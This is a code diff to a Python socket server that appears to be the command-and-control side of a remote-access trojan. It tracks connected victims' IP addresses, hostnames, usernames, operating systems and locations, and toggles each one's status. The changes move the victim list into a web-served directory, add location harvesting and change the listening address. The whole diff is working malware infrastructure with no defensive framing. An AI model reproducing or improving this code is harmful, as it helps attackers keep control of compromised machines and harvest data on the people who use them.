@@ -11,7 +11,7 @@ from Crypto.Random import get_random_bytes
 from base64 import b64decode
 from base64 import b64encode
 
-Host = "192.168.30.52"
+Host = "192.168.140.65"
 Port = 6565
 client_list=[]
 address_list = []
@@ -103,7 +103,7 @@ HORSE ="""
 def data_read():
     try:
         while data_collection:
-            with open('./Data/client_list.json') as f:
+            with open('/var/www/html/client_list.json') as f:
                 global data 
                 data = json.load(f)
             time.sleep(1)
@@ -150,8 +150,9 @@ def client_connected(server):
             client_list.append(sam_client)
             address_list.append(sam_address)
             check_hostname(decrypt_data(sam_client.recv(1024)).decode("utf-8"),sam_client,sam_address)
-    except:
-        print(colour.info("[*] Socket sessions closed."))
+    except Exception as e:
+        print(e)
+        print(colour.info("[*] Socket session closed."))
         history_saver("[*] Socket sessions closed.")
 
 
@@ -169,17 +170,19 @@ def check_hostname(HostName,client,address):
         client.send(enc)
         IP = address[0]
         Port = address[1]
-        UserName = decrypt_data(client.recv(1024)).decode("utf-8")
+        info = json.loads(decrypt_data(client.recv(1024)).decode("utf-8"))
         new_client = {
             "IP" : IP,
             "Port" : Port,
             "HostName" : HostName,
-            "UserName" : UserName,
+            "UserName" : info["username"],
+            "System": info["system"],
+            "Loc": info["country"]+"\\"+info["city"],
             "NickName" : HostName,
-            "Status" : "False"
+            "Status" : "True"
         }
         data['client_list'].append(new_client)
-    with open("./Data/client_list.json","w") as f:
+    with open("/var/www/html/client_list.json","w") as f:
         json.dump(data,f,indent=4)
     output(colour.info(f"[*] {HostName} connected."))
             
@@ -290,7 +293,7 @@ def nick(HostName,NickName):
             history_saver(f"[*] {HostName}'s NickName Changed as: {NickName}")
             print(colour.info(f"[*] {HostName}'s NickName Changed as: {NickName}"))
             client["NickName"] = NickName
-            with open('./Data/client_list.json', 'w') as f:
+            with open('/var/www/html/client_list.json', 'w') as f:
                 json.dump(data, f,indent=4)
 
 def close():
@@ -302,17 +305,19 @@ def close():
     data_collection = False 
     for client in data['client_list']:
         client["Status"] = "False"
-    with open('./Data/client_list.json', 'w') as f:
+    with open('/var/www/html/client_list.json', 'w') as f:
         json.dump(data, f,indent=4)
                        
     ### send message to client for go silent mode ###
 
 def lists():
-    data_header = data['client_list'][0].keys()
-    table = f"{tabulate([list(d.values()) for d in data['client_list']], headers=data_header)}"
-    history_saver(table)
-    print(f"\n{table}\n")
-
+    try:
+        data_header = data['client_list'][0].keys()
+        table = f"{tabulate([list(d.values()) for d in data['client_list']], headers=data_header)}"
+        history_saver(table)
+        print(f"\n{table}\n")
+    except:
+        print(colour.info("[*] Empty List!!!"))
 
 
 def start(NickName):
@@ -321,7 +326,7 @@ def start(NickName):
             history_saver(f"[*] {NickName}'s Status Changed as: True ")
             print(colour.info(f"[*] {NickName}'s Status Changed as: True"))
             client["Status"] = "True"
-            with open('./Data/client_list.json', 'w') as f:
+            with open('/var/www/html/client_list.json', 'w') as f:
                 json.dump(data, f,indent=4)
 
 
@@ -332,7 +337,7 @@ def stop(NickName):
             print(colour.info(f"[*] {NickName}'s Status Changed as: False"))
             client["Status"] = "False"
             IP = client["IP"]
-            with open('./Data/client_list.json', 'w') as f:
+            with open('/var/www/html/client_list.json', 'w') as f:
                 json.dump(data, f,indent=4)
     for client in client_list : 
         raddr = client.getpeername()[0] if client else None
